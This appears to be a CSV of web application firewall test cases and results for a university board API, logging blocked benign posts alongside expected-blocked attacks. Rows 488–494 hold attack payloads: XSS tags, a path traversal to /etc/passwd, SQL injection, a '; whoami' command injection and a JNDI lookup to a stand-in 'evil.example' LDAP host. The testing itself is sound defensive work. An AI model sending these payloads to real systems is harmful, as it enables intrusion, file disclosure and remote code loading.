sample_id,source_file,case_id,group_name,intent_class,method,target,payload_or_query,interpretation,attack_family,expected_code,expected_meaning,observed_off,observed_on,response_code_transition,current_assessment
461,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_011,Auth Post Feature,ambiguous,POST,/api/board/posts/${board_post_id_12}/comments/${board_comment_id_12}/delete,,인증 후 게시글·댓글 작성 흐름에서 보안 용어를 문맥적으로 설명하는 요청이다.,normal_business_request,204,authenticated_delete_should_succeed,404,404,404 -> 404,blocked_by_parent_failure_needs_jmx_guard
462,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_012,Auth Post Feature,ambiguous,POST,/api/board/posts/${board_post_id_12}/delete,,인증 후 게시글·댓글 작성 흐름에서 보안 용어를 문맥적으로 설명하는 요청이다.,normal_business_request,204,authenticated_delete_should_succeed,404,404,404 -> 404,blocked_by_parent_failure_needs_jmx_guard
463,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_013,Auth Post Feature,normal,POST,/api/board/posts,"{""title"":""캠퍼스 행사 공지 ${mixed500_v2_run_id}"",""content"":""캠퍼스 세미나와 공모전 일정을 공유하는 정상 게시글입니다.""}",인증 후 게시글·댓글 작성/수정/삭제 기능을 사용하는 정상 요청이다.,normal_business_request,201,authenticated_board_post_should_be_created,403,403,403 -> 403,needs_policy_review
464,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_014,Auth Post Feature,normal,POST,/api/board/posts/${board_post_id_13}/comments,"{""content"":""일정 확인했습니다.""}",인증 후 게시글·댓글 작성/수정/삭제 기능을 사용하는 정상 요청이다.,normal_business_request,201,authenticated_comment_should_be_created,404,404,404 -> 404,blocked_by_parent_failure_needs_jmx_guard
465,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_015,Auth Post Feature,normal,POST,/api/board/posts/${board_post_id_13}/update,"{""title"":""캠퍼스 행사 공지 수정 ${mixed500_v2_run_id}"",""content"":""캠퍼스 세미나와 공모전 일정을 공유하는 정상 게시글입니다. 수정본입니다.""}",인증 후 게시글·댓글 작성/수정/삭제 기능을 사용하는 정상 요청이다.,normal_business_request,200,authenticated_update_should_succeed,403,403,403 -> 403,blocked_by_parent_failure_needs_jmx_guard
466,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_016,Auth Post Feature,normal,POST,/api/board/posts/${board_post_id_13}/comments/${board_comment_id_13}/update,"{""content"":""일정 확인했습니다. 수정본""}",인증 후 게시글·댓글 작성/수정/삭제 기능을 사용하는 정상 요청이다.,normal_business_request,200,authenticated_update_should_succeed,404,404,404 -> 404,blocked_by_parent_failure_needs_jmx_guard
467,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_017,Auth Post Feature,normal,POST,/api/board/posts/${board_post_id_13}/comments/${board_comment_id_13}/delete,,인증 후 게시글·댓글 작성/수정/삭제 기능을 사용하는 정상 요청이다.,normal_business_request,204,authenticated_delete_should_succeed,404,404,404 -> 404,blocked_by_parent_failure_needs_jmx_guard
468,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_018,Auth Post Feature,normal,POST,/api/board/posts/${board_post_id_13}/delete,,인증 후 게시글·댓글 작성/수정/삭제 기능을 사용하는 정상 요청이다.,normal_business_request,204,authenticated_delete_should_succeed,404,404,404 -> 404,blocked_by_parent_failure_needs_jmx_guard
469,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_019,Auth Post Feature,ambiguous,POST,/api/board/posts,"{""title"":""WAF 과탐 사례 ${mixed500_v2_run_id}"",""content"":""cmd.exe, powershell -enc, union select 같은 문자열을 문맥적으로 설명하는 게시글입니다.""}",인증 후 게시글·댓글 작성 흐름에서 보안 용어를 문맥적으로 설명하는 요청이다.,sqli,201,authenticated_board_post_should_be_created,403,403,403 -> 403,needs_policy_review
470,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_020,Auth Post Feature,ambiguous,POST,/api/board/posts/${board_post_id_14}/comments,"{""content"":""교육용 문자열 정리입니다.""}",인증 후 게시글·댓글 작성 흐름에서 보안 용어를 문맥적으로 설명하는 요청이다.,normal_business_request,201,authenticated_comment_should_be_created,404,404,404 -> 404,blocked_by_parent_failure_needs_jmx_guard
471,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_021,Auth Post Feature,ambiguous,POST,/api/board/posts/${board_post_id_14}/update,"{""title"":""WAF 과탐 사례 수정 ${mixed500_v2_run_id}"",""content"":""cmd.exe, powershell -enc, union select 같은 문자열을 문맥적으로 설명하는 게시글입니다. 수정본입니다.""}",인증 후 게시글·댓글 작성 흐름에서 보안 용어를 문맥적으로 설명하는 요청이다.,sqli,200,authenticated_update_should_succeed,403,403,403 -> 403,blocked_by_parent_failure_needs_jmx_guard
472,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_022,Auth Post Feature,ambiguous,POST,/api/board/posts/${board_post_id_14}/comments/${board_comment_id_14}/update,"{""content"":""교육용 문자열 정리입니다. 수정본""}",인증 후 게시글·댓글 작성 흐름에서 보안 용어를 문맥적으로 설명하는 요청이다.,normal_business_request,200,authenticated_update_should_succeed,404,404,404 -> 404,blocked_by_parent_failure_needs_jmx_guard
473,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_023,Auth Post Feature,ambiguous,POST,/api/board/posts/${board_post_id_14}/comments/${board_comment_id_14}/delete,,인증 후 게시글·댓글 작성 흐름에서 보안 용어를 문맥적으로 설명하는 요청이다.,normal_business_request,204,authenticated_delete_should_succeed,404,404,404 -> 404,blocked_by_parent_failure_needs_jmx_guard
474,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_024,Auth Post Feature,ambiguous,POST,/api/board/posts/${board_post_id_14}/delete,,인증 후 게시글·댓글 작성 흐름에서 보안 용어를 문맥적으로 설명하는 요청이다.,normal_business_request,204,authenticated_delete_should_succeed,404,404,404 -> 404,blocked_by_parent_failure_needs_jmx_guard
475,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_025,Auth Post Feature,normal,POST,/api/board/posts,"{""title"":""학사 일정 안내 ${mixed500_v2_run_id}"",""content"":""학사 일정과 시험 주간 공지를 공유합니다.""}",인증 후 게시글·댓글 작성/수정/삭제 기능을 사용하는 정상 요청이다.,normal_business_request,201,authenticated_board_post_should_be_created,403,403,403 -> 403,needs_policy_review
476,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_026,Auth Post Feature,normal,POST,/api/board/posts,"{""title"":""장학금 신청 안내 ${mixed500_v2_run_id}"",""content"":""장학금 신청 일정과 제출 서류를 정리합니다.""}",인증 후 게시글·댓글 작성/수정/삭제 기능을 사용하는 정상 요청이다.,normal_business_request,201,authenticated_board_post_should_be_created,403,403,403 -> 403,needs_policy_review
477,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_027,Auth Post Feature,normal,POST,/api/board/posts,"{""title"":""기숙사 점검 안내 ${mixed500_v2_run_id}"",""content"":""기숙사 정기 점검 일정을 안내합니다.""}",인증 후 게시글·댓글 작성/수정/삭제 기능을 사용하는 정상 요청이다.,normal_business_request,201,authenticated_board_post_should_be_created,403,403,403 -> 403,needs_policy_review
478,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_028,Auth Post Feature,normal,POST,/api/board/posts,"{""title"":""캡스톤 공지 ${mixed500_v2_run_id}"",""content"":""캡스톤 발표 일정을 공유합니다.""}",인증 후 게시글·댓글 작성/수정/삭제 기능을 사용하는 정상 요청이다.,normal_business_request,201,authenticated_board_post_should_be_created,403,403,403 -> 403,needs_policy_review
479,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_029,Auth Post Feature,normal,POST,/api/board/posts,"{""title"":""수강정정 안내 ${mixed500_v2_run_id}"",""content"":""수강정정 기간과 절차를 정리합니다.""}",인증 후 게시글·댓글 작성/수정/삭제 기능을 사용하는 정상 요청이다.,normal_business_request,201,authenticated_board_post_should_be_created,403,403,403 -> 403,needs_policy_review
480,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_030,Auth Post Feature,normal,POST,/api/board/posts,"{""title"":""학생회 행사 안내 ${mixed500_v2_run_id}"",""content"":""학생회 행사 참여 방법을 안내합니다.""}",인증 후 게시글·댓글 작성/수정/삭제 기능을 사용하는 정상 요청이다.,normal_business_request,201,authenticated_board_post_should_be_created,403,403,403 -> 403,needs_policy_review
481,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_031,Auth Post Feature,normal,POST,/api/board/posts,"{""title"":""세미나 신청 안내 ${mixed500_v2_run_id}"",""content"":""보안 세미나 신청 방법을 정리합니다.""}",인증 후 게시글·댓글 작성/수정/삭제 기능을 사용하는 정상 요청이다.,normal_business_request,201,authenticated_board_post_should_be_created,403,403,403 -> 403,needs_policy_review
482,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_032,Auth Post Feature,ambiguous,POST,/api/board/posts,"{""title"":""보안 수업 자료 ${mixed500_v2_run_id}"",""content"":""union all select와 script 태그 필터링 사례를 설명합니다.""}",인증 후 게시글·댓글 작성 흐름에서 보안 용어를 문맥적으로 설명하는 요청이다.,sqli,201,authenticated_board_post_should_be_created,403,403,403 -> 403,needs_policy_review
483,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_033,Auth Post Feature,ambiguous,POST,/api/board/posts,"{""title"":""로그 분석 메모 ${mixed500_v2_run_id}"",""content"":""cmd.exe 와 whoami 결과 문자열을 분석합니다.""}",인증 후 게시글·댓글 작성 흐름에서 보안 용어를 문맥적으로 설명하는 요청이다.,command_injection,201,authenticated_board_post_should_be_created,403,403,403 -> 403,needs_policy_review
484,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_034,Auth Post Feature,ambiguous,POST,/api/board/posts,"{""title"":""필터 우회 사례 ${mixed500_v2_run_id}"",""content"":""../admin 경로 예시와 XSS payload 설명을 기록합니다.""}",인증 후 게시글·댓글 작성 흐름에서 보안 용어를 문맥적으로 설명하는 요청이다.,xss,201,authenticated_board_post_should_be_created,403,403,403 -> 403,needs_policy_review
485,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_035,Auth Post Feature,ambiguous,POST,/api/board/posts,"{""title"":""시큐어코딩 토론 ${mixed500_v2_run_id}"",""content"":""drop table 금지 정책과 query string 보안을 다룹니다.""}",인증 후 게시글·댓글 작성 흐름에서 보안 용어를 문맥적으로 설명하는 요청이다.,sqli,201,authenticated_board_post_should_be_created,403,403,403 -> 403,needs_policy_review
486,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_036,Auth Post Feature,ambiguous,POST,/api/board/posts,"{""title"":""교육용 공격 문자열 ${mixed500_v2_run_id}"",""content"":""powershell -enc 예시를 수업 관점에서 정리합니다.""}",인증 후 게시글·댓글 작성 흐름에서 보안 용어를 문맥적으로 설명하는 요청이다.,command_injection,201,authenticated_board_post_should_be_created,403,403,403 -> 403,needs_policy_review
487,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_037,Auth Post Feature,ambiguous,POST,/api/board/posts,"{""title"":""WAF 튜닝 메모 ${mixed500_v2_run_id}"",""content"":""alert tcp 룰과 false positive 사례를 기록합니다.""}",인증 후 게시글·댓글 작성 흐름에서 보안 용어를 문맥적으로 설명하는 요청이다.,normal_business_request,201,authenticated_board_post_should_be_created,403,403,403 -> 403,needs_policy_review
488,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_038,Auth Post Feature,attack,POST,/api/board/posts,"{""title"":""<script>alert(1)</script>"",""content"":""명확한 XSS 시도""}",인증 후 게시글·댓글 작성 흐름에 명확한 공격 패턴을 넣어 차단 여부를 검증하는 요청이다.,xss,403,explicit_attack_payload_should_be_blocked,403,403,403 -> 403,as_designed
489,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_039,Auth Post Feature,attack,POST,/api/board/posts,"{""title"":""../../../../etc/passwd"",""content"":""경로 탐색 시도""}",인증 후 게시글·댓글 작성 흐름에 명확한 공격 패턴을 넣어 차단 여부를 검증하는 요청이다.,path_traversal,403,explicit_attack_payload_should_be_blocked,403,403,403 -> 403,as_designed
490,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_040,Auth Post Feature,attack,POST,/api/board/posts,"{""title"":""' OR '1'='1"",""content"":""SQL 인젝션 시도""}",인증 후 게시글·댓글 작성 흐름에 명확한 공격 패턴을 넣어 차단 여부를 검증하는 요청이다.,sqli,403,explicit_attack_payload_should_be_blocked,403,403,403 -> 403,as_designed
491,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_041,Auth Post Feature,attack,POST,/api/board/posts,"{""title"":""<img src=x onerror=alert(1)>"",""content"":""명확한 XSS onerror 시도""}",인증 후 게시글·댓글 작성 흐름에 명확한 공격 패턴을 넣어 차단 여부를 검증하는 요청이다.,xss,403,explicit_attack_payload_should_be_blocked,403,403,403 -> 403,as_designed
492,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_042,Auth Post Feature,attack,POST,/api/board/posts,"{""title"":""; whoami"",""content"":""명령 삽입 시도""}",인증 후 게시글·댓글 작성 흐름에 명확한 공격 패턴을 넣어 차단 여부를 검증하는 요청이다.,command_injection,403,explicit_attack_payload_should_be_blocked,403,403,403 -> 403,as_designed
493,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_043,Auth Post Feature,attack,POST,/api/board/posts,"{""title"":""${jndi:ldap://evil.example/a}"",""content"":""JNDI 인젝션 시도""}",인증 후 게시글·댓글 작성 흐름에 명확한 공격 패턴을 넣어 차단 여부를 검증하는 요청이다.,jndi_injection,403,explicit_attack_payload_should_be_blocked,403,403,403 -> 403,as_designed
494,FP_BOARD_SEARCH_URL_EXPANDED_500_V2.jmx,auth_post_044,Auth Post Feature,attack,POST,/api/board/posts,"{""title"":""<svg/onload=alert(1)>"",""content"":""SVG XSS 시도""}",인증 후 게시글·댓글 작성 흐름에 명확한 공격 패턴을 넣어 차단 여부를 검증하는 요청이다.,xss,403,explicit_attack_payload_should_be_blocked,403,403,403 -> 403,as_designed
